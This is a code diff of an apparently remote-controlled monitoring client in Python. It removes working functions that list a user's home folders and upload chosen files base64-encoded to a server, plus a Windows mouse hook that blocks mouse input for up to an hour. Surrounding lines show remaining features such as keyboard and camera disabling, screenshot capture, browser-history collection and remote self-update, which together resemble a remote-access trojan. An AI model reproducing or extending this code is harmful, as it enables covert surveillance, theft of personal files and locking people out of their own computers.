@@ -110,10 +110,8 @@ last_message_id = 0
 SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
 update_lock = Lock()
-mouse_disable_lock = Lock()
 keyboard_disable_lock = Lock()
 camera_disable_lock = Lock()
-mouse_hook_callback = None
 keyboard_hook_callback = None
 browser_history_seen = set()
 
@@ -1040,109 +1038,6 @@ def trigger_screenshot_capture():
         report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
 
 
-def default_remote_file_roots():
-    home_dir = os.path.expanduser("~")
-    candidates = []
-    for folder_name in ("Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"):
-        folder_path = os.path.join(home_dir, folder_name)
-        if os.path.isdir(folder_path):
-            candidates.append(folder_path)
-    if not candidates:
-        return [home_dir]
-    return candidates
-
-
-def list_remote_files(start_path=None):
-    raw_path = str(start_path or "").strip()
-    home_dir = os.path.expanduser("~")
-    base_path = raw_path or home_dir
-    if not base_path or not os.path.exists(base_path):
-        return []
-
-    try:
-        normalized_home = os.path.normcase(os.path.normpath(home_dir))
-        normalized_base = os.path.normcase(os.path.normpath(base_path))
-        if normalized_base == normalized_home:
-            common_roots = []
-            for folder_path in default_remote_file_roots():
-                common_roots.append({
-                    "name": os.path.basename(folder_path) or folder_path,
-                    "path": folder_path,
-                    "is_dir": True,
-                    "size": 0,
-                    "modified_at": int(os.path.getmtime(folder_path) * 1000) if os.path.exists(folder_path) else 0,
-                })
-            if common_roots:
-                common_roots.sort(key=lambda item: str(item["name"]).lower())
-                return common_roots
-
-        entries = []
-        with os.scandir(base_path) as iterator:
-            for entry in iterator:
-                try:
-                    stat = entry.stat(follow_symlinks=False)
-                except OSError:
-                    continue
-                entries.append({
-                    "name": entry.name,
-                    "path": entry.path,
-                    "is_dir": entry.is_dir(follow_symlinks=False),
-                    "size": int(getattr(stat, "st_size", 0) or 0),
-                    "modified_at": int(getattr(stat, "st_mtime", 0) * 1000),
-                })
-        entries.sort(key=lambda item: (0 if item["is_dir"] else 1, str(item["name"]).lower()))
-        return entries
-    except OSError:
-        return []
-
-
-def post_file_listing(device_id, path, entries):
-    payload = json.dumps({
-        "device_id": device_id,
-        "path": path,
-        "entries": entries,
-    }).encode("utf-8")
-    headers = {"Content-Type": "application/json"}
-    api_key = os.getenv("INGEST_API_KEY", "").strip()
-    if api_key:
-        headers["x-api-key"] = api_key
-    request = Request(
-        f"{SITE_URL}/api/devices/file-listing-upload",
-        headers=headers,
-        data=payload,
-        method="POST",
-    )
-    with urlopen(request, timeout=20) as response:
-        if response.status >= 400:
-            raise RuntimeError(f"HTTP {response.status}")
-
-
-def upload_file_download(device_id, file_path, file_name, file_data):
-    if not file_data:
-        raise RuntimeError("The selected file is empty.")
-    payload = json.dumps({
-        "device_id": device_id,
-        "path": file_path,
-        "file_name": file_name,
-        "file_size": len(file_data),
-        "file_base64": base64.b64encode(file_data).decode("utf-8"),
-    }).encode("utf-8")
-    headers = {"Content-Type": "application/json"}
-    api_key = os.getenv("INGEST_API_KEY", "").strip()
-    if api_key:
-        headers["x-api-key"] = api_key
-    request = Request(
-        f"{SITE_URL}/api/devices/file-download-upload",
-        headers=headers,
-        data=payload,
-        method="POST",
-    )
-    with urlopen(request, timeout=30) as response:
-        if response.status >= 400:
-            raise RuntimeError(f"HTTP {response.status}")
-        return json.loads(response.read().decode("utf-8"))
-
-
 def poll_screenshot_request():
     try:
         headers = {"Content-Type": "application/json"}
@@ -1196,16 +1091,6 @@ def handle_device_command(command, command_id=None, message=""):
             collection_paused = True
         elif command == "resume":
             collection_paused = False
-        elif command == "disable_mouse":
-            if os.name != "nt":
-                raise RuntimeError("Mouse disabling is only supported on Windows")
-            try:
-                duration = int(str(message).strip())
-            except ValueError as error:
-                raise RuntimeError("Mouse duration must be a whole number of seconds") from error
-            if duration < 1 or duration > 3600:
-                raise RuntimeError("Mouse duration must be between 1 and 3600 seconds")
-            start_mouse_disable(duration)
         elif command == "disable_keyboard":
             if os.name != "nt":
                 raise RuntimeError("Keyboard disabling is only supported on Windows")
@@ -1245,21 +1130,6 @@ def handle_device_command(command, command_id=None, message=""):
             if not str(message).strip():
                 raise RuntimeError("Autofill text cannot be empty")
             autofill_text(str(message))
-        elif command == "list_files":
-            root_path = str(message).strip()
-            entries = list_remote_files(root_path)
-            post_file_listing(device_id, root_path, entries)
-        elif command == "download_file":
-            file_path = str(message).strip()
-            if not file_path:
-                raise RuntimeError("File path is required for the transfer request.")
-            if not os.path.isfile(file_path):
-                raise RuntimeError(f"File not found: {file_path}")
-            with open(file_path, "rb") as handle:
-                file_bytes = handle.read()
-            if len(file_bytes) > 25 * 1024 * 1024:
-                raise RuntimeError("File transfer is limited to 25 MB to keep the network usage light.")
-            upload_file_download(device_id, file_path, os.path.basename(file_path), file_bytes)
         elif command == "update_client":
             if os.name != "nt":
                 raise RuntimeError("Client updates are only supported on Windows")
@@ -1275,61 +1145,6 @@ def handle_device_command(command, command_id=None, message=""):
         acknowledge_device_command(command_id, "completed")
     except (OSError, RuntimeError, AttributeError) as error:
         acknowledge_device_command(command_id, "failed", str(error))
-
-
-def start_mouse_disable(duration):
-    if not mouse_disable_lock.acquire(blocking=False):
-        raise RuntimeError("Mouse is already disabled")
-
-    ready = Event()
-    result = {}
-    Thread(target=mouse_disable_worker, args=(duration, ready, result), daemon=True).start()
-    if not ready.wait(1):
-        mouse_disable_lock.release()
-        raise RuntimeError("Mouse hook did not start")
-    if result.get("error"):
-        mouse_disable_lock.release()
-        raise RuntimeError(result["error"])
-
-
-def mouse_disable_worker(duration, ready, result):
-    global mouse_hook_callback
-    user32 = ctypes.windll.user32
-    kernel32 = ctypes.windll.kernel32
-    hook_type = 14
-    callback_type = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
-
-    def low_level_mouse_proc(_code, _wparam, _lparam):
-        return 1
-
-    mouse_hook_callback = callback_type(low_level_mouse_proc)
-    hook = user32.SetWindowsHookExW(hook_type, mouse_hook_callback, kernel32.GetModuleHandleW(None), 0)
-    if not hook:
-        result["error"] = f"Could not install mouse hook: {ctypes.get_last_error()}"
-        ready.set()
-        mouse_disable_lock.release()
-        return
-
-    ready.set()
-    try:
-        end_time = time.monotonic() + duration
-        message = wintypes.MSG()
-        peek_message = getattr(user32, "PeekMessageW", None)
-        while time.monotonic() < end_time:
-            if peek_message is None:
-                if user32.GetMessageW(ctypes.byref(message), None, 0, 0) == 0:
-                    break
-                user32.TranslateMessage(ctypes.byref(message))
-                user32.DispatchMessageW(ctypes.byref(message))
-                continue
-            while peek_message(ctypes.byref(message), None, 0, 0, 1):
-                user32.TranslateMessage(ctypes.byref(message))
-                user32.DispatchMessageW(ctypes.byref(message))
-            time.sleep(0.01)
-    finally:
-        user32.UnhookWindowsHookEx(hook)
-        mouse_hook_callback = None
-        mouse_disable_lock.release()
 
 
 def start_keyboard_disable(duration):
